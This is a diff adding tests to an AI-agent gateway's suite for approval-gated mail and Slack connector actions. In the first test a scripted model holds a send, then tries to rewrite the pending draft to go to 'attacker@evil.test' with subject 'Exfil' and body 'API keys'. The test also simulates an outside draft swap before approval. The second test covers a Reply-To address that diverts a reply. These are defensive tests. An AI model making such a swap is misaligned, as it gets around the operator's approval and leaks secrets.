@@ -738,4 +738,286 @@ describe('connector tools & deferred execution gate', () => {
     expect(executedTools).toEqual(['mail_archive', 'notion_create_page'])
     expect(getApproval(db, notionApprovalId)!.execution_status).toBe('succeeded')
   })
+
+  it('prevents TOCTOU draft-swap attacks both at mail_draft update time and via snapshot verification at Approve time', async () => {
+    const dataDir = mkdtempSync(join(tmpdir(), 'osb-conn-toctou-'))
+    const db = openDb(':memory:')
+    upsertBot(db, { id: 'inbox-keeper', name: 'Sorter', role: 'inbox', emoji: '📥', soul_path: '' })
+    const threadId = ensureDmThread(db, 'inbox-keeper')
+
+    const mail = activateConnectorAccount(
+      db,
+      createConnectorAccount(db, { app: 'gmail', remoteId: 'rem_m' }).id,
+      { remoteId: 'rem_m', accountLabel: 'alice@gmail.com' },
+    )!
+    setBotConnectors(db, 'inbox-keeper', [mail.id])
+
+    let currentDraft = {
+      to: ['bob@acme.com'],
+      cc: [] as string[],
+      bcc: [] as string[],
+      subject: 'Benign Status Report',
+      body: 'Everything is on track.',
+    }
+    let draftUpdateCalls = 0
+    let executeWriteCalls = 0
+
+    const driver = makeStubDriver({
+      readMail: async (_acc, sel) => {
+        if (sel.draftId === 'draft_swap') {
+          return {
+            draftId: 'draft_swap',
+            messages: [
+              {
+                id: 'm_swap',
+                from: 'alice@gmail.com',
+                to: currentDraft.to,
+                cc: currentDraft.cc,
+                ...(currentDraft.bcc.length ? { bcc: currentDraft.bcc } : {}),
+                subject: currentDraft.subject,
+                date: 'now',
+                body: currentDraft.body,
+                automated: false,
+                attachments: [],
+              },
+            ],
+          }
+        }
+        return { messages: [] }
+      },
+      createOrUpdateDraft: async () => {
+        draftUpdateCalls++
+        return { draftId: 'draft_swap', summary: 'updated' }
+      },
+      executeWrite: async () => {
+        executeWriteCalls++
+        return { status: 'succeeded', summary: 'Sent draft_swap' }
+      },
+    })
+
+    // Turn 1: model holds mail_send({ draftId: 'draft_swap' }), then immediately tries to overwrite draft_swap via mail_draft!
+    const llm = scriptedLlm([
+      {
+        toolCalls: [
+          { id: 'hold1', name: 'mail_send', args: { draftId: 'draft_swap' } },
+          {
+            id: 'swap1',
+            name: 'mail_draft',
+            args: { draftId: 'draft_swap', to: ['attacker@evil.test'], subject: 'Exfil', body: 'API keys' },
+          },
+        ],
+      },
+      { content: 'Waiting for approval.' },
+    ])
+
+    const gw = createApp({ db, llm, dataDir, connectorDriver: driver })
+    await gw.app.request(`http://127.0.0.1:4747/api/threads/${threadId}/messages`, {
+      method: 'POST',
+      headers: { 'content-type': 'application/json' },
+      body: JSON.stringify({ text: 'Send draft_swap' }),
+    })
+
+    await vi.waitFor(() => {
+      expect(listMessages(db, threadId).some((m) => m.content === 'Waiting for approval.')).toBe(true)
+    })
+
+    // Layer B: mail_draft in-place update on a pending held draft MUST be rejected
+    expect(draftUpdateCalls).toBe(0)
+    const swapReply = String(llm.seenMessages[1]!.filter((m) => m.role === 'tool')[1]?.content ?? '')
+    expect(swapReply).toMatch(/pending|held|approval/i)
+
+    // Layer A: FrozenExecution carries resolvedDraftSnapshot alongside args.draftId
+    const chip = listMessages(db, threadId).find((m) => m.kind === 'approval_request')!
+    const approvalId = (chip.payload as { approvalId: number }).approvalId
+    const storedFrozen = JSON.parse(getApproval(db, approvalId)!.execution_json!) as FrozenExecution
+    expect(storedFrozen.args).toEqual({ draftId: 'draft_swap' })
+    expect(storedFrozen.resolvedDraftSnapshot).toEqual({
+      to: ['bob@acme.com'],
+      cc: [],
+      bcc: [],
+      subject: 'Benign Status Report',
+      body: 'Everything is on track.',
+    })
+
+    // Layer C: Simulate external modification of draft_swap in Gmail before operator clicks Approve
+    currentDraft = {
+      to: ['attacker@evil.test'],
+      cc: [],
+      bcc: [],
+      subject: 'Benign Status Report',
+      body: 'Everything is on track.',
+    }
+    const approveRes = await gw.app.request(`http://127.0.0.1:4747/api/approvals/${approvalId}`, {
+      method: 'POST',
+      headers: { 'content-type': 'application/json' },
+      body: JSON.stringify({ decision: 'approve' }),
+    })
+    expect(approveRes.status).toBe(202)
+    expect(executeWriteCalls).toBe(0)
+    expect(getApproval(db, approvalId)!.execution_status).toBe('failed')
+    const failNotices = listMessages(db, threadId).filter(
+      (m) => (m.payload as { notice?: string } | null)?.notice === 'connector_execution',
+    )
+    expect(failNotices).toHaveLength(1)
+  })
+
+  it('uses Reply-To rather than From for mail_reply approval recipient and standing-rule target', async () => {
+    const dataDir = mkdtempSync(join(tmpdir(), 'osb-conn-replyto-'))
+    const db = openDb(':memory:')
+    upsertBot(db, { id: 'inbox-keeper', name: 'Sorter', role: 'inbox', emoji: '📥', soul_path: '' })
+    const threadId = ensureDmThread(db, 'inbox-keeper')
+
+    const mail = activateConnectorAccount(
+      db,
+      createConnectorAccount(db, { app: 'gmail', remoteId: 'rem_m' }).id,
+      { remoteId: 'rem_m', accountLabel: 'alice@gmail.com' },
+    )!
+    setBotConnectors(db, 'inbox-keeper', [mail.id])
+
+    // Standing rule exists for boss@acme.com, NOT for drop@external.test
+    createRule(db, { botId: 'inbox-keeper', kind: 'email', target: 'boss@acme.com', duration: 'always', now: Date.now() })
+
+    let writes = 0
+    const driver = makeStubDriver({
+      readMail: async (_acc, sel) => {
+        if (sel.messageId === 'msg_rt') {
+          return {
+            messages: [
+              {
+                id: 'msg_rt',
+                threadId: 'th_rt',
+                from: 'Boss <boss@acme.com>',
+                replyTo: ['Drop <drop@external.test>'],
+                to: ['alice@gmail.com'],
+                cc: [],
+                subject: 'Urgent',
+                date: 'now',
+                body: 'Reply here',
+                automated: false,
+                attachments: [],
+              },
+            ],
+          }
+        }
+        return { messages: [] }
+      },
+      executeWrite: async () => {
+        writes++
+        return { status: 'succeeded', summary: 'Replied' }
+      },
+    })
+
+    const llm = scriptedLlm([
+      { toolCalls: [{ id: 'r1', name: 'mail_reply', args: { messageId: 'msg_rt', body: 'Ack' } }] },
+      { content: 'Held reply.' },
+    ])
+    const gw = createApp({ db, llm, dataDir, connectorDriver: driver })
+    await gw.app.request(`http://127.0.0.1:4747/api/threads/${threadId}/messages`, {
+      method: 'POST',
+      headers: { 'content-type': 'application/json' },
+      body: JSON.stringify({ text: 'Reply to msg_rt' }),
+    })
+
+    await vi.waitFor(() => {
+      expect(listMessages(db, threadId).filter((m) => m.kind === 'approval_request')).toHaveLength(1)
+    })
+
+    // Must NOT have auto-executed via boss@acme.com rule because Reply-To goes to drop@external.test!
+    expect(writes).toBe(0)
+    const chip = listMessages(db, threadId).find((m) => m.kind === 'approval_request')!
+    expect(chip.payload).toMatchObject({
+      status: 'pending',
+      kind: 'email',
+      target: 'drop@external.test',
+    })
+    expect(String((chip.payload as { action?: string }).action)).toContain('Drop <drop@external.test>')
+    expect(String((chip.payload as { detail?: string }).detail)).toContain('To: Drop <drop@external.test>')
+  })
+
+  it('transitions bot WS presence back to idle and records uncertain/failed when frozen execution throws or is blocked', async () => {
+    const dataDir = mkdtempSync(join(tmpdir(), 'osb-conn-presence-'))
+    const db = openDb(':memory:')
+    upsertBot(db, { id: 'inbox-keeper', name: 'Sorter', role: 'inbox', emoji: '📥', soul_path: '' })
+    const threadId = ensureDmThread(db, 'inbox-keeper')
+
+    const slack = activateConnectorAccount(
+      db,
+      createConnectorAccount(db, { app: 'slack', remoteId: 'rem_s' }).id,
+      { remoteId: 'rem_s', accountLabel: 'Acme Slack' },
+    )!
+    setBotConnectors(db, 'inbox-keeper', [slack.id])
+
+    const driver = makeStubDriver({
+      executeWrite: async () => {
+        throw new Error('ECONNRESET mid-response')
+      },
+    })
+
+    const llm = scriptedLlm([
+      { toolCalls: [{ id: 's1', name: 'slack_send_message', args: { channelId: 'C111', text: 'Hello' } }] },
+      { content: 'Held.' },
+    ])
+    const gw = createApp({ db, llm, dataDir, connectorDriver: driver })
+    const statuses: string[] = []
+    gw.hub.add({
+      send: (raw) => {
+        const ev = JSON.parse(raw) as { type: string; botId?: string; state?: string }
+        if (ev.type === 'status' && ev.botId === 'inbox-keeper' && ev.state) statuses.push(ev.state)
+      },
+    })
+
+    await gw.app.request(`http://127.0.0.1:4747/api/threads/${threadId}/messages`, {
+      method: 'POST',
+      headers: { 'content-type': 'application/json' },
+      body: JSON.stringify({ text: 'Post Hello' }),
+    })
+
+    await vi.waitFor(() => expect(statuses.at(-1)).toBe('waiting'))
+
+    const chip = listMessages(db, threadId).find((m) => m.kind === 'approval_request')!
+    const approvalId = (chip.payload as { approvalId: number }).approvalId
+
+    const res = await gw.app.request(`http://127.0.0.1:4747/api/approvals/${approvalId}`, {
+      method: 'POST',
+      headers: { 'content-type': 'application/json' },
+      body: JSON.stringify({ decision: 'approve' }),
+    })
+    expect(res.status).toBe(202)
+    expect(getApproval(db, approvalId)!.execution_status).toBe('uncertain')
+    expect(statuses.at(-1)).toBe('idle')
+    expect(gw.hello()).toEqual({ type: 'hello', statuses: {} })
+
+    // Also verify revoked/failed path transitions WS status from waiting -> idle
+    const llm2 = scriptedLlm([
+      { toolCalls: [{ id: 's2', name: 'slack_send_message', args: { channelId: 'C222', text: 'Second' } }] },
+      { content: 'Held second.' },
+    ])
+    const gw2 = createApp({ db, llm: llm2, dataDir, connectorDriver: driver })
+    const statuses2: string[] = []
+    gw2.hub.add({
+      send: (raw) => {
+        const ev = JSON.parse(raw) as { type: string; botId?: string; state?: string }
+        if (ev.type === 'status' && ev.botId === 'inbox-keeper' && ev.state) statuses2.push(ev.state)
+      },
+    })
+    await gw2.app.request(`http://127.0.0.1:4747/api/threads/${threadId}/messages`, {
+      method: 'POST',
+      headers: { 'content-type': 'application/json' },
+      body: JSON.stringify({ text: 'Post Second' }),
+    })
+    await vi.waitFor(() => expect(statuses2.at(-1)).toBe('waiting'))
+    const chip2 = listMessages(db, threadId).filter((m) => m.kind === 'approval_request').at(-1)!
+    const approvalId2 = (chip2.payload as { approvalId: number }).approvalId
+
+    setBotConnectors(db, 'inbox-keeper', [])
+    const res2 = await gw2.app.request(`http://127.0.0.1:4747/api/approvals/${approvalId2}`, {
+      method: 'POST',
+      headers: { 'content-type': 'application/json' },
+      body: JSON.stringify({ decision: 'approve' }),
+    })
+    expect(res2.status).toBe(202)
+    expect(getApproval(db, approvalId2)!.execution_status).toBe('failed')
+    expect(statuses2.at(-1)).toBe('idle')
+    expect(gw2.hello()).toEqual({ type: 'hello', statuses: {} })
+  })
 })
